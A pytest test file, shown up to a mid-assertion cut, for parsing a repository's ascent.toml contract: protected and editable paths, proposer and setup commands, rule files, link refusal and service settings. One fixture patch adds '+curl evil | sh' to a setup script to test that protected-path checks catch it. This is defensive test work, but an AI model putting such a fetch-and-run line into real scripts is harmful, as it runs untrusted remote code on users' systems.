"""Tests for reading a repository's ascent.toml and the environment its run gets."""

from __future__ import annotations

import io
import pickle
import re
import tarfile
from dataclasses import replace
from pathlib import Path

import pytest
from openascent import contract

from core.worker import hardening_runner

from .. import repo_constraints
from ..repo_constraints import (
    CONSTRAINTS_FILE,
    ConstraintsError,
    McpServer,
    MetricSpec,
    RepoConstraints,
    RoleEnvironment,
    ServiceSpec,
    TargetStage,
    effective_environment,
    instructions_brief,
    parse_constraints,
    read_constraints,
    scorer_only_paths,
)
from ..repo_tree import patch_violations

_CFCA = b"""
version = 1
instructions = "docs/intent.md"

[paths]
editable = ["bot/geocode"]
protected = ["bot/geocode/eval", "data/labels.csv"]

[setup]
command = "pip install -r requirements.txt"
"""
# The metric scores only what a [run] or a target stage gives it, so a contract needs one (SKY-761).
_RUN = b'\n[run]\nentry = "run.py:main"\n'
_INTENT = b"Return the coordinates of the place the sender most likely means.\nKeep the reply format unchanged.\n"


def _archive(
    tmp_path: Path, files: dict[str, bytes], *, link: str | None = None, link_name: str = CONSTRAINTS_FILE
) -> Path:
    """Pack files the way the parent ships a fetched tree.

    Args:
        tmp_path: Scratch folder.
        files: Root-relative path to bytes.
        link: When set, a symbolic link named ``link_name`` pointing here.
        link_name: The path of the link; ``ascent.toml`` unless a test links another file.

    Returns:
        The archive.
    """
    archive = tmp_path / "tree.tgz"
    with tarfile.open(archive, "w:gz") as packed:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            packed.addfile(info, io.BytesIO(data))
        if link is not None:
            info = tarfile.TarInfo(link_name)
            info.type, info.linkname = tarfile.SYMTYPE, link
            packed.addfile(info)
    return archive


def _read(tmp_path: Path, raw: bytes, files: dict[str, bytes] | None = None) -> RepoConstraints | None:
    """Read ``raw`` as the constraints file of a snapshot that also holds ``files``.

    Args:
        tmp_path: Scratch folder.
        raw: The ascent.toml bytes.
        files: Other files, keyed by root-relative path.

    Returns:
        What :func:`read_constraints` returns.
    """
    return read_constraints(_archive(tmp_path, {CONSTRAINTS_FILE: raw, **(files or {})}))


def test_a_repository_without_the_file_keeps_the_approved_settings(tmp_path: Path) -> None:
    """No file means the approved paths and setup stand, and the file name itself is still protected.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    assert read_constraints(_archive(tmp_path, {"src/app.py": b"x = 1\n"})) is None

    environment = effective_environment(None, approved_editable=["src"], approved_setup=None)

    assert environment.editable_paths == ("src",)
    assert environment.protected_paths == (CONSTRAINTS_FILE,)
    assert environment.setup_command is None


# The file name before SKY-746, built from parts so the tree holds no retired name.
_RETIRED_FILE = "optimize" + ".toml"


def test_a_repository_with_only_the_retired_file_has_no_contract(tmp_path: Path) -> None:
    """Skynet reads only ascent.toml; a repository with only the old file name has no contract (SKY-746).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    assert CONSTRAINTS_FILE == "ascent.toml"
    archive = _archive(tmp_path, {_RETIRED_FILE: _CFCA + _RUN, "docs/intent.md": _INTENT})

    assert read_constraints(archive) is None


def test_a_repository_with_both_files_uses_ascent_toml(tmp_path: Path) -> None:
    """With both names present, the run reads ascent.toml and ignores the old file (SKY-746).

    Args:
        tmp_path: Pytest's temporary folder.
    """
    retired = b'version = 1\n[paths]\neditable = ["old"]\n[run]\nentry = "old.py:main"\n'
    archive = _archive(tmp_path, {CONSTRAINTS_FILE: _CFCA + _RUN, _RETIRED_FILE: retired, "docs/intent.md": _INTENT})

    constraints = read_constraints(archive)

    assert constraints is not None
    assert constraints.editable_paths == ("bot/geocode",)


def test_the_file_narrows_paths_protects_files_and_proposes_setup(tmp_path: Path) -> None:
    """A valid file narrows the editable paths, adds protected ones, and fills in the missing setup.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = read_constraints(
        _archive(tmp_path, {CONSTRAINTS_FILE: _CFCA + _RUN, "bot/app.py": b"", "docs/intent.md": _INTENT})
    )
    assert constraints is not None

    environment = effective_environment(constraints, approved_editable=["bot"], approved_setup=None)

    assert environment.editable_paths == ("bot/geocode",)
    assert environment.protected_paths == (
        CONSTRAINTS_FILE,
        "docs/intent.md",
        "bot/geocode/eval",
        "data/labels.csv",
    )
    assert environment.setup_command == "pip install -r requirements.txt"
    record = environment.record(
        repository="cfca/bot", commit="a" * 40, readonly_paths=["vendor"], secret_names={"GEO_KEY": "v"}
    )
    assert record["constraints_file"] == {"path": CONSTRAINTS_FILE, "sha256": constraints.sha256}
    assert record["secret_names"] == ["GEO_KEY"]
    assert record["services"] == []
    assert record["instructions"] == {"path": "docs/intent.md", "intent": _INTENT.decode().strip()}
    brief = instructions_brief(environment, (CONSTRAINTS_FILE, "bot/geocode/eval"))
    assert "`data/labels.csv`" in brief
    assert CONSTRAINTS_FILE not in brief
    assert "bot/geocode/eval" not in brief
    assert "Some repository files are hidden from you." in brief
    assert "Guidance from `docs/intent.md` (not enforced" in brief
    assert "Keep the reply format unchanged." in brief


def test_the_approved_setup_command_wins_and_says_so() -> None:
    """A run's own setup command is kept, with a note that the file's proposal was not used."""
    constraints = parse_constraints(_CFCA + _RUN)

    environment = effective_environment(constraints, approved_editable=["."], approved_setup="uv sync")

    assert environment.setup_command == "uv sync"
    assert environment.notes == (f"The run's own setup command replaces the one in {CONSTRAINTS_FILE}.",)


_OWN_PROPOSER = (
    b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nsetup = ["npm", "ci"]\nentry = ["node", "my agent.js"]\n'
)


def test_the_snapshot_holds_the_proposer_entry_and_setup(tmp_path: Path) -> None:
    """``[proposer] entry`` and ``setup`` are read as command lists (SKY-753).

    Args:
        tmp_path: Folder for the packed snapshot.
    """
    constraints = _read(tmp_path, _OWN_PROPOSER)
    assert constraints is not None

    assert constraints.proposer_entry == ("node", "my agent.js")
    assert constraints.proposer_setup == ("npm", "ci")


def test_a_contract_without_the_proposer_keys_keeps_the_runners_own_agent() -> None:
    """With no ``entry``, nothing changes: no command and no note."""
    environment = effective_environment(parse_constraints(_CFCA + _RUN), approved_editable=["."], approved_setup=None)

    assert environment.constraints is not None
    assert environment.constraints.proposer_entry is None
    assert environment.proposer_entry is None
    assert environment.proposer_setup is None
    assert environment.notes == ()


def test_the_file_proposer_applies_when_the_run_names_none() -> None:
    """A run with no proposer of its own uses the file's command, and its record names it."""
    environment = effective_environment(parse_constraints(_OWN_PROPOSER), approved_editable=["."], approved_setup=None)

    assert environment.proposer_entry == ("node", "my agent.js")
    assert environment.proposer_setup == ("npm", "ci")
    assert environment.notes == ("The run uses the proposer command in the contract file: node 'my agent.js'",)
    record = environment.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())
    assert (record["proposer_entry"], record["proposer_setup"]) == (["node", "my agent.js"], ["npm", "ci"])


def test_the_runs_own_proposer_wins_and_says_so() -> None:
    """A run that names its proposer keeps it, with the same kind of note as ``[setup] command``."""
    environment = effective_environment(
        parse_constraints(_OWN_PROPOSER), approved_editable=["."], approved_setup=None, approved_proposer=True
    )

    assert environment.proposer_entry is None
    assert environment.proposer_setup is None
    assert environment.notes == ("The run's own proposer replaces the one in the contract file.",)
    record = environment.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())
    assert "proposer_setup" not in record


def test_the_entry_script_is_protected_when_the_file_proposer_applies(tmp_path: Path) -> None:
    """A version cannot rewrite the script that proposes the next versions, like ``ascent.toml`` (SKY-753).

    Args:
        tmp_path: Folder for the packed snapshot.
    """
    constraints = _read(
        tmp_path,
        b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nentry = ["node", "./agent/run.js", "--fast"]\n',
        {"agent/run.js": b"// agent", "src/app.js": b"// app"},
    )
    assert constraints is not None

    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)
    replaced = effective_environment(constraints, approved_editable=["."], approved_setup=None, approved_proposer=True)

    assert constraints.proposer_command_files == ("agent/run.js",)
    assert environment.protected_paths == (CONSTRAINTS_FILE, "agent/run.js")
    patch = (
        "diff --git a/agent/run.js b/agent/run.js\n--- a/agent/run.js\n+++ b/agent/run.js\n"
        "@@ -1 +1 @@\n-// agent\n+// mine\n"
    )
    assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)
    assert environment.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())["proposer_entry"] == [
        "node",
        "./agent/run.js",
        "--fast",
    ]
    assert replaced.protected_paths == (CONSTRAINTS_FILE,)
    assert "proposer_entry" not in replaced.record(repository="o/r", commit="c", readonly_paths=(), secret_names=())


@pytest.mark.parametrize(
    ("key", "command", "files", "link", "link_name", "through"),
    [
        (
            "entry",
            '["node", "agent/run.js"]',
            {"agent/real.js": b"// agent"},
            "real.js",
            "agent/run.js",
            "agent/run.js",
        ),
        ("entry", '["node", "agent/run.js"]', {"tools/agent/run.js": b"// agent"}, "tools/agent", "agent", "agent"),
        ("setup", '["sh", "./agent/setup.sh"]', {"tools/agent/setup.sh": b"#"}, "tools/agent", "agent", "agent"),
    ],
    ids=["linked-file", "linked-folder", "setup-in-linked-folder"],
)
def test_a_command_path_through_a_tracked_link_is_refused(
    tmp_path: Path, key: str, command: str, files: dict[str, bytes], link: str, link_name: str, through: str
) -> None:
    """Protection matches paths, so a link would leave the proposer's real code open to a version (SKY-753).

    Args:
        tmp_path: Folder for the packed snapshot.
        key: The ``[proposer]`` key that names the path.
        command: The TOML command list.
        files: The real files of the snapshot.
        link: Where the link points.
        link_name: The path of the link.
        through: The link the error names.
    """
    entry = "" if key == "entry" else 'entry = ["node", "main.js"]\n'
    raw = f'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\n{entry}{key} = {command}\n'.encode()
    archive = _archive(tmp_path, {CONSTRAINTS_FILE: raw, **files}, link=link, link_name=link_name)

    with pytest.raises(ConstraintsError, match=f"symbolic link '{through}'") as caught:
        read_constraints(archive)

    assert (caught.value.section, caught.value.key) == ("proposer", key)


@pytest.mark.parametrize("key", ["entry", "setup"])
def test_a_proposer_command_with_the_launch_key_token_is_refused(tmp_path: Path, key: str) -> None:
    """The bridge puts the relay key in place of the token, so the package refuses it in a command (SKY-776).

    Args:
        tmp_path: Folder for the packed snapshot.
        key: The ``[proposer]`` key that holds the token.
    """
    entry = "" if key == "entry" else 'entry = ["node", "main.js"]\n'
    raw = (
        f'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\n{entry}{key} = ["node", "--key=__ASCENT_MODEL_KEY__"]\n'
    ).encode()

    with pytest.raises(ConstraintsError, match=r"cannot contain __ASCENT_MODEL_KEY__.*ASCENT_MODEL_KEY") as parsed:
        parse_constraints(raw)
    with pytest.raises(ConstraintsError, match="cannot contain __ASCENT_MODEL_KEY__") as read:
        read_constraints(_archive(tmp_path, {CONSTRAINTS_FILE: raw}))

    assert (parsed.value.section, parsed.value.key) == ("proposer", key)
    assert (read.value.section, read.value.key) == ("proposer", key)


@pytest.mark.parametrize("vendor", ["APP", "SKYNET"])
def test_an_old_key_token_in_the_proposer_entry_names_the_current_key_variable(vendor: str) -> None:
    """The refusal of a key token from before SKY-776 points at ``ASCENT_MODEL_KEY``, which every box sets.

    Args:
        vendor: The old token's prefix.
    """
    old_variable = f"{vendor}_API_KEY"
    raw = f'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nentry = ["node", "--key=__{old_variable}__"]\n'

    with pytest.raises(ConstraintsError, match=f"cannot contain __{old_variable}__.*ASCENT_MODEL_KEY") as caught:
        parse_constraints(raw.encode())

    assert (caught.value.section, caught.value.key) == ("proposer", "entry")
    assert "_".join(("APP", "API", "KEY")) not in str(caught.value).replace(f"__{old_variable}__", "")


@pytest.mark.parametrize(
    ("key", "link_name"), [("entry", "agent/lib.js"), ("setup", "agent/lib/deep/util.js")], ids=["top", "nested"]
)
def test_a_named_folder_that_holds_a_tracked_link_is_refused(tmp_path: Path, key: str, link_name: str) -> None:
    """A link inside a named folder would leave the file it points at open to a version (SKY-753).

    Args:
        tmp_path: Folder for the packed snapshot.
        key: The ``[proposer]`` key that names the folder.
        link_name: The path of the link inside the folder.
    """
    entry = "" if key == "entry" else 'entry = ["node", "main.js"]\n'
    raw = (
        f'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\n{entry}{key} = ["npm", "start", "--prefix", "agent"]\n'
    ).encode()
    files = {CONSTRAINTS_FILE: raw, "agent/package.json": b"{}", "src/lib.js": b"// lib", "main.js": b"//"}
    archive = _archive(tmp_path, files, link="../src/lib.js", link_name=link_name)

    with pytest.raises(
        ConstraintsError, match=f"folder 'agent', which holds the symbolic link '{link_name}'"
    ) as caught:
        read_constraints(archive)

    assert (caught.value.section, caught.value.key) == ("proposer", key)


def test_a_link_outside_the_named_folder_is_allowed(tmp_path: Path) -> None:
    """Only links inside the named folder matter; ``agent-tools`` is not inside ``agent`` (SKY-753).

    Args:
        tmp_path: Folder for the packed snapshot.
    """
    raw = b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nentry = ["npm", "start", "--prefix", "agent"]\n'
    files = {CONSTRAINTS_FILE: raw, "agent/package.json": b"{}", "src/lib.js": b"// lib"}
    archive = _archive(tmp_path, files, link="../src/lib.js", link_name="agent-tools/lib.js")

    constraints = read_constraints(archive)

    assert constraints is not None
    assert constraints.proposer_command_files == ("agent",)


def test_a_folder_that_the_setup_names_is_protected_with_everything_in_it(tmp_path: Path) -> None:
    """``npm ci --prefix agent`` protects the agent folder, but never the checkout root or a path outside (SKY-753).

    Args:
        tmp_path: Folder for the packed snapshot.
    """
    constraints = _read(
        tmp_path,
        b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nentry = ["node", "agent/bin/run.js"]\n'
        b'setup = ["npm", "ci", "--prefix", "./agent/", ".", "..", "../agent", "src/app", "missing"]\n',
        {"agent/bin/run.js": b"// agent", "agent/package.json": b"{}", "src/app.js": b"// app"},
    )
    assert constraints is not None

    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)

    assert constraints.proposer_command_files == ("agent/bin/run.js", "agent")
    patch = (
        "diff --git a/agent/package.json b/agent/package.json\n--- a/agent/package.json\n"
        "+++ b/agent/package.json\n@@ -1 +1 @@\n-{}\n+{ }\n"
    )
    assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)


def test_the_setup_script_is_protected_when_the_file_proposer_applies(tmp_path: Path) -> None:
    """A version cannot rewrite the script that ``[proposer] setup`` runs before the first session.

    Args:
        tmp_path: Folder for the packed snapshot.
    """
    constraints = _read(
        tmp_path,
        b'version = 1\n[run]\nentry = "run.py:main"\n'
        b'[proposer]\nsetup = ["sh", "scripts/setup.sh"]\nentry = ["node", "agent/run.js"]\n',
        {"agent/run.js": b"// agent", "scripts/setup.sh": b"npm ci\n"},
    )
    assert constraints is not None

    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)
    replaced = effective_environment(constraints, approved_editable=["."], approved_setup=None, approved_proposer=True)

    assert environment.protected_paths == (CONSTRAINTS_FILE, "agent/run.js", "scripts/setup.sh")
    patch = (
        "diff --git a/scripts/setup.sh b/scripts/setup.sh\n--- a/scripts/setup.sh\n+++ b/scripts/setup.sh\n"
        "@@ -1 +1 @@\n-npm ci\n+curl evil | sh\n"
    )
    assert patch_violations(patch, environment.editable_paths, (), environment.protected_paths)
    assert replaced.protected_paths == (CONSTRAINTS_FILE,)


def test_an_editable_path_that_only_the_proposer_command_protects_names_the_command_files(tmp_path: Path) -> None:
    """The error blames ``[proposer] entry`` and names its files, not ``[paths] protected`` (SKY-753).

    Args:
        tmp_path: Folder for the packed snapshot.
    """
    constraints = _read(
        tmp_path,
        b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nentry = ["node", "agent/run.js"]\n',
        {"agent/run.js": b"// agent"},
    )
    assert constraints is not None

    with pytest.raises(
        ConstraintsError, match=r"the files that \[proposer\] entry and setup name \(agent/run.js\)"
    ) as caught:
        effective_environment(constraints, approved_editable=["agent/run.js"], approved_setup=None)

    assert (caught.value.section, caught.value.key) == ("proposer", "entry")
    with pytest.raises(ConstraintsError, match=r"outside \[paths\] protected editable"):
        effective_environment(constraints, approved_editable=["ascent.toml"], approved_setup=None)


def test_the_file_cannot_widen_the_approved_editable_paths() -> None:
    """Asking to edit outside the approved paths fails with the path and the way to fix it."""
    constraints = parse_constraints(b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\neditable = ["bot", "eval"]\n')

    with pytest.raises(ConstraintsError, match="'eval' editable, which is outside the approved editable paths"):
        effective_environment(constraints, approved_editable=["bot"], approved_setup=None)


@pytest.mark.parametrize(
    ("raw", "approved"),
    [
        (
            b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\neditable = ["bot/geocode"]\nprotected = ["bot"]\n',
            ["bot"],
        ),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\nprotected = ["bot"]\n', ["bot/geocode"]),
        (b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\neditable = ["ascent.toml"]\n', ["."]),
    ],
)
def test_a_file_that_protects_every_editable_path_fails_the_setup_check(raw: bytes, approved: list[str]) -> None:
    """A run where every edit would be refused as protected fails before it spends its budget.

    Args:
        raw: The ``ascent.toml`` bytes.
        approved: The approved protected paths.
    """
    constraints = parse_constraints(raw)

    with pytest.raises(ConstraintsError, match="protects every editable path"):
        effective_environment(constraints, approved_editable=approved, approved_setup=None)


def test_a_run_without_the_file_that_can_only_edit_the_file_fails_the_setup_check() -> None:
    """The constraints file is protected even when absent, so approving only it leaves nothing to change."""
    with pytest.raises(ConstraintsError, match="is always protected, so the approved editable paths"):
        effective_environment(None, approved_editable=["ascent.toml"], approved_setup=None)


def test_a_file_that_protects_part_of_an_editable_path_still_runs() -> None:
    """Protecting a file inside an editable folder leaves the rest of the folder editable."""
    constraints = parse_constraints(
        b'version = 1\n[run]\nentry = "run.py:main"\n[paths]\nprotected = ["bot/labels.csv"]\n'
    )

    environment = effective_environment(constraints, approved_editable=["bot"], approved_setup=None)

    assert environment.editable_paths == ("bot",)


def test_a_linked_constraints_file_is_refused(tmp_path: Path) -> None:
    """A symbolic link could point the rules anywhere, so only a regular file counts.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    with pytest.raises(ConstraintsError, match="must be a regular file"):
        read_constraints(_archive(tmp_path, {"real.toml": b""}, link="real.toml"))


_RULES = b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nillegal = "docs/rules.md"\n'
_RULE_FILE = b"""# Rules for this repository

- Do not hardcode answers
  for dataset cases.
- Do not call an outside geocoding service.
"""


def test_plain_language_rules_are_numbered_recorded_and_put_in_the_brief(tmp_path: Path) -> None:
    """Every bullet of the rule file reaches the agent at the start, numbered, and is saved with the run.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read(tmp_path, _RULES, {"docs/rules.md": _RULE_FILE})
    assert constraints is not None

    environment = effective_environment(constraints, approved_editable=["bot"], approved_setup=None)

    assert environment.rules == (
        "Do not hardcode answers for dataset cases.",
        "Do not call an outside geocoding service.",
    )
    assert constraints.proposer.illegal == environment.rules
    record = environment.record(repository="cfca/bot", commit="a" * 40, readonly_paths=[], secret_names=[])
    assert record["rules"] == list(environment.rules)
    assert record["instructions"] is None
    brief = instructions_brief(environment, (CONSTRAINTS_FILE,))
    assert "Rule 1: Do not hardcode answers for dataset cases." in brief
    assert "Rule 2: Do not call an outside geocoding service." in brief
    assert "score of 0" not in brief
    assert "is not scored" in brief


def test_a_file_without_rules_records_an_empty_list() -> None:
    """Runs without rules record none, so a resumed run that adds rules is detected."""
    environment = effective_environment(None, approved_editable=["src"], approved_setup=None)

    assert environment.rules == ()
    assert environment.record(repository="o/r", commit="a" * 40, readonly_paths=[], secret_names=[])["rules"] == []


@pytest.mark.parametrize(
    ("raw", "outcome"),
    [
        (None, {"target": None, "require": {}, "direction": "maximize"}),
        (b'version = 1\n[run]\nentry = "run.py:main"\n', {"target": None, "require": {}, "direction": "maximize"}),
        (
            b'version = 1\n[run]\nentry = "run.py:main"\n[outcome]\ntarget = 0.9\n[outcome.require]\nlatency = 0.5\n',
            {"target": 0.9, "require": {"latency": 0.5}, "direction": "maximize"},
        ),
        (
            b'version = 1\n[metric]\ndirection = "minimize"\n[run]\nentry = "run.py:main"\n[outcome]\ntarget = 0.2\n',
            {"target": 0.2, "require": {}, "direction": "minimize"},
        ),
        (
            b'version = 1\n[metric.scores]\ncost_usd = "minimize"\n[run]\nentry = "run.py:main"\n'
            b"[outcome.require]\ncost_usd = 0.05\n",
            {
                "target": None,
                "require": {"cost_usd": 0.05},
                "direction": "maximize",
                "scores": {"cost_usd": "minimize"},
            },
        ),
    ],
)
def test_the_record_holds_the_outcome(raw: bytes | None, outcome: dict[str, object]) -> None:
    """Every new run records the file's target, limits and score directions; a file without them records none.

    Args:
        raw: The ``ascent.toml`` bytes, or None for no file.
        outcome: The outcome the record must hold.
    """
    constraints = None if raw is None else parse_constraints(raw)
    environment = effective_environment(constraints, approved_editable=["."], approved_setup=None)

    record = environment.record(repository="o/r", commit="a" * 40, readonly_paths=[], secret_names=[])

    assert record["outcome"] == outcome


def test_parsing_alone_keeps_the_paths_and_leaves_the_text_empty() -> None:
    """parse_constraints reads only the toml; read_constraints fills the text from the same snapshot (E48)."""
    constraints = parse_constraints(_CFCA + _RULES.removeprefix(b"version = 1\n"))

    assert (constraints.instructions_file, constraints.proposer.illegal_file) == ("docs/intent.md", "docs/rules.md")
    assert (constraints.intent, constraints.rules, constraints.proposer.illegal) == (None, (), ())
    assert constraints.rule_files == ("docs/intent.md", "docs/rules.md")


@pytest.mark.parametrize(
    ("text", "rules"),
    [
        (b"- one\n- two\n", ("one", "two")),
        (b"* one\n+ two\n-\tthree\n", ("one", "two", "three")),
        (b"Intro? no\n", None),
        (
            b"# Title\n\n- one\n  more of one\n\n  still one\n## Next\n- two\nlazy two\n",
            ("one more of one still one", "two lazy two"),
        ),
        (b"\xef\xbb\xbf- one\n", ("one",)),
        (b"- Do not X.\n#1 Do not hardcode answers.\n", ("Do not X. #1 Do not hardcode answers.",)),
        (b"- Do not X.\n#hashtag text\n", ("Do not X. #hashtag text",)),
        (b"#\n###### Deep\n- one\n", ("one",)),
        (b"- one\r\n- two\r\n", ("one", "two")),
    ],
)
def test_each_top_level_bullet_is_one_rule(tmp_path: Path, text: bytes, rules: tuple[str, ...] | None) -> None:
    """Indented and directly following lines continue a bullet; headings and blank lines separate them.

    A leading byte-order mark is dropped. A ``#`` line that is not a heading is text, so it continues a bullet.

    Args:
        tmp_path: Pytest's temporary folder.
        text: The rule file's bytes.
        rules: The rules the file must give, or None for none.
    """
    if rules is None:
        with pytest.raises(ConstraintsError, match=r"line 1 of 'docs/rules\.md' .* is not part of a top-level bullet"):
            _read(tmp_path, _RULES, {"docs/rules.md": text})
        return
    constraints = _read(tmp_path, _RULES, {"docs/rules.md": text})

    assert constraints is not None
    assert constraints.rules == rules


@pytest.mark.parametrize(
    ("text", "message"),
    [
        (b"", r"\[proposer\] illegal names 'docs/rules\.md', which holds no rules"),
        (b"# Only a heading\n\n", r"which holds no rules"),
        (
            b"- one\n\nA paragraph after a blank line.\n",
            r"line 3 of 'docs/rules\.md' .* not part of a top-level bullet",
        ),
        (b"#1 Do not hardcode answers.\n- one\n", r"line 1 of 'docs/rules\.md' .* not part of a top-level bullet"),
        (b"- one\n\n#hashtag text\n", r"line 3 of 'docs/rules\.md' .* not part of a top-level bullet"),
        (b"####### Too deep\n- one\n", r"line 1 of 'docs/rules\.md' .* not part of a top-level bullet"),
        (b"- one\n-\n", r"rule 2 in 'docs/rules\.md' .* must be text of 1 to 500 characters"),
        (b"- " + b"x" * 501 + b"\n", r"rule 1 in 'docs/rules\.md' .* must be text of 1 to 500 characters"),
        (b"- x\n" * 51, r"holds 51 rules; the most is 50"),
        (b"- x" + b" " * (32 * 1024), r"which is larger than 32 KiB"),
        (b"- caf\xe9\n", r"which is not UTF-8 text"),
    ],
)
def test_a_bad_rule_file_fails_with_a_reason(tmp_path: Path, text: bytes, message: str) -> None:
    """An empty, oversized or unreadable rule file, or text outside a bullet, fails the setup check.

    Args:
        tmp_path: Pytest's temporary folder.
        text: The rule file's bytes.
        message: A pattern of the error the setup check must give.
    """
    with pytest.raises(ConstraintsError, match=message):
        _read(tmp_path, _RULES, {"docs/rules.md": text})


def test_a_missing_rule_or_instructions_file_fails_with_a_reason(tmp_path: Path) -> None:
    """A path that names no file in the snapshot fails the setup check and names the setting.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    with pytest.raises(ConstraintsError, match=r"\[proposer\] illegal names 'docs/rules\.md', but .* no such file"):
        _read(tmp_path, _RULES, {"docs/other.md": _RULE_FILE})
    with pytest.raises(ConstraintsError, match=r"instructions names 'docs/intent\.md', but .* no such file"):
        _read(tmp_path, _CFCA + _RUN)


def test_a_linked_or_folder_rule_file_is_refused(tmp_path: Path) -> None:
    """A link could point the rules anywhere, so only a regular file counts.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    linked = _archive(
        tmp_path, {CONSTRAINTS_FILE: _RULES, "real.md": _RULE_FILE}, link="../real.md", link_name="docs/rules.md"
    )
    with pytest.raises(ConstraintsError, match=r"'docs/rules\.md', which must be a regular file"):
        read_constraints(linked)
    folder = tmp_path / "folder.tgz"
    with tarfile.open(folder, "w:gz") as packed:
        raw = b'version = 1\n[run]\nentry = "run.py:main"\n[proposer]\nillegal = "docs"\n'
        info = tarfile.TarInfo(CONSTRAINTS_FILE)
        info.size = len(raw)
        packed.addfile(info, io.BytesIO(raw))
        info = tarfile.TarInfo("docs")
        info.type = tarfile.DIRTYPE
        packed.addfile(info)
    with pytest.raises(ConstraintsError, match=r"names 'docs', which must be a regular file"):
        read_constraints(folder)


def test_an_empty_or_oversized_instructions_file_fails_with_a_reason(tmp_path: Path) -> None:
    """The intent is the whole instructions file, so it must hold text and fit the agent's brief.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    with pytest.raises(ConstraintsError, match=r"instructions names 'docs/intent\.md', but that file is empty"):
        _read(tmp_path, _CFCA + _RUN, {"docs/intent.md": b"  \n\n"})
    with pytest.raises(ConstraintsError, match=r"'docs/intent\.md' is longer than 4000 characters"):
        _read(tmp_path, _CFCA + _RUN, {"docs/intent.md": b"x" * 4001})


def test_every_rule_file_is_protected_once(tmp_path: Path) -> None:
    """The instructions file and each role's rule file are protected, so no version can change its own rules.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    raw = _CFCA + (
        b'[proposer]\nillegal = "docs/rules.md"\n'
        b'[run]\nentry = "bot/geocode/app.py:f"\nillegal = "bot/geocode/run_rules.md"\n'
        b'[metric]\nillegal = "docs/rules.md"\n'
    )
    constraints = _read(
        tmp_path,
        raw,
        {
            "docs/intent.md": _INTENT,
            "docs/rules.md": _RULE_FILE,
            "bot/geocode/run_rules.md": b"- Do not cache answers.\n",
        },
    )
    assert constraints is not None

    environment = effective_environment(constraints, approved_editable=["bot"], approved_setup=None)

    assert environment.protected_paths == (
        CONSTRAINTS_FILE,
        "docs/intent.md",
        "docs/rules.md",
        "bot/geocode/run_rules.md",
        "bot/geocode/eval",
        "data/labels.csv",
    )
    assert constraints.run_role.illegal == ("Do not cache answers.",)
    assert constraints.metric_role.illegal == constraints.rules


def test_a_rule_file_that_is_the_only_editable_path_fails_the_setup_check(tmp_path: Path) -> None:
    """A run that could only edit its own rule file has nothing to change, so it fails before it spends budget.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = _read(tmp_path, _RULES, {"docs/rules.md": _RULE_FILE})
    assert constraints is not None

    with pytest.raises(ConstraintsError, match="protects every editable path"):
        effective_environment(constraints, approved_editable=["docs/rules.md"], approved_setup=None)


_ENVIRONMENT = b"""
version = 1

[proposer]
mcp = "tools/proposer.mcp.json"
network = ["pypi.org", "files.pythonhosted.org"]
services = ["maps"]
illegal = "docs/rules.md"

[target.planner]
entry = "agents/planner.py:plan"
mcp = "agents/planner.mcp.json"
network = []
services = ["maps"]
illegal = "agents/planner_rules.md"
vcpus = 4
timeout = 30

[target.router]
entry = ["node", "router.js"]

[services.maps]
url = "https://maps.googleapis.com/maps/api"
headers = { Authorization = "Bearer ${GOOGLE_MAPS_API_KEY}" }

[metric]
files = ["eval/metric.py", "eval/cases"]
reference = "eval/reference.json"
"""
_ENVIRONMENT_FILES = {
    CONSTRAINTS_FILE: _ENVIRONMENT,
    "docs/rules.md": b"- Do not hardcode answers.\n- Do not read the metric.\n",
    "agents/planner_rules.md": b"- Do not call a paid model.\n",
    "tools/proposer.mcp.json": b'{"mcpServers": {"files": {"url": "https://files.example.com/mcp"}}}',
    "agents/planner.mcp.json": b'{"mcpServers": {}}',
}


def test_the_environment_sections_parse_into_typed_fields(tmp_path: Path) -> None:
    """Every new key reaches the parsed object, so the runtime issues can enforce it.

    Args:
        tmp_path: Pytest's temporary folder.
    """
    constraints = read_constraints(_archive(tmp_path, _ENVIRONMENT_FILES))
    assert constraints is not None

    assert constraints.proposer == RoleEnvironment(
        network=("pypi.org", "files.pythonhosted.org"),
        services=("maps",),
        illegal=("Do not hardcode answers.", "Do not read the metric."),
        illegal_file="docs/rules.md",
        mcp="tools/proposer.mcp.json",
        mcp_servers=(McpServer(name="files", url="https://files.example.com/mcp"),),
    )
    assert constraints.targets == {
        "planner": TargetStage(
            entry="agents/planner.py:plan",
            mcp="agents/planner.mcp.json",
            network=(),
            services=("maps",),
            illegal=("Do not call a paid model.",),
            illegal_file="agents/planner_rules.md",
            vcpus=4,
            timeout=30.0,
        ),
        "router": TargetStage(entry=("node", "router.js")),
    }
    assert constraints.services == {
        "maps": ServiceSpec(
            secrets=("GOOGLE_MAPS_API_KEY",),
            url="https://maps.googleapis.com/maps/api",
            headers={"Authorization": "Bearer ${GOOGLE_MAPS_API_KEY}"},
        )
    }
    assert constraints.metric == MetricSpec(
